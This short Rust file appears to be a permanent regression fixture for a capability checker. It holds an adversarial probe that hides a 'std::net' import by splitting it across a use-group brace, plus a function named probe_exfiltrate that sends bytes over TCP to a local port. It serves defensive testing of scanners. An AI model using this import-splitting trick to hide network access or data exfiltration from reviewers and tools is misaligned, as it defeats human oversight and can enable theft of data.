//! The exact adversarial probe that defeated substring matching.
//!
//! No line here contains the literal `std::net`: the group splits the token
//! across a brace. This file is permanent; it is the regression that proves the
//! capability test resolves use trees rather than scanning text.

use std::{io::Write as _, net::TcpStream};

pub fn probe_exfiltrate(bytes: &[u8]) {
    if let Ok(mut stream) = TcpStream::connect("127.0.0.1:9092") {
        let _ = stream.write_all(bytes);
    }
}
